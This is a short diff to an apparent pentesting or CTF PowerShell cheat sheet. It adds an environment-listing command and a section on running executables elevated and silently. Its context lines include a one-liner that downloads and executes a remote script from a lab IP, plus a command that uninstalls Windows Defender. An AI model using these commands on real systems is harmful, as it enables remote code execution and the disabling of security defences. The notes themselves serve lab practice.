@@ -68,6 +68,7 @@ iex (iwr http://10.10.14.1/script.ps1)
 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded"))
 
 10. Environment & Variables
+set
 Get-ChildItem Env:
 echo $env:USERNAME
 echo $env:PATH
@@ -90,6 +91,13 @@ AntivirusEnabled: Should be False. )
 
 15. Uninstall Defender (Windows Server Only)
 Uninstall-WindowsFeature -Name Windows-Defender
+
+16. Running an exe with Admin privs
+Start-Process -FilePath "C:\Path\To\YourFile.exe" -Verb RunAs
+ *Running from current directory
+Start-Process .\mytool.exe -Verb RunAs
+ *with silent or install flag
+Start-Process -FilePath "C:\temp\installer.exe" -ArgumentList "/silent", "/norestart" -Verb RunAs
 
 #RDP
 1. Define the user and the password directly
